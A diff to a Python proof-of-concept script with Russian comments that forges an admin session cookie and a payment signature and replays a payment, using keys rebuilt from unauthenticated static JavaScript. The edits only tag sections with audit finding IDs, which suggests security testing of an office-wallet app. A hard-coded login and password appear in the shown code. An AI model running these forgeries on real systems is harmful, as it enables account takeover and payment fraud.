@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-01 — подделка сессии и платёжной подписи.
+01 — подделка сессии и платёжной подписи (OW-35, OW-28, OW-17).
 
 Ключи собираются из статики, которая отдаётся без авторизации:
   app/static/wallet.js       keyParts = ["office","-","wallet"]
@@ -59,7 +59,7 @@ def post(url: str, data: dict, cookie: str) -> tuple[int, str]:
 
 
 def demo_session() -> None:
-    print("== 1. подделка сессии с ролью admin ==")
+    print("== 1. OW-35/OW-28: подделка сессии с ролью admin ==")
     cookie = make_cookie(6, "admin")
     print("SESSION_KEY =", SESSION_KEY)
     print("cookie      =", cookie)
@@ -78,7 +78,7 @@ def demo_session() -> None:
 
 
 def demo_payment_replay(op: int, amount: int, recipient: int, to_login: str) -> None:
-    print("\n== 2. подделка платёжной подписи и повтор платежа ==")
+    print("\n== 2. OW-17: подделка платёжной подписи и повтор платежа ==")
     # сначала обычный вход, чтобы была валидная сессия
     login = urllib.parse.urlencode(
         {"login": "ivanov", "password": "workplace1", "return": "/"}).encode()
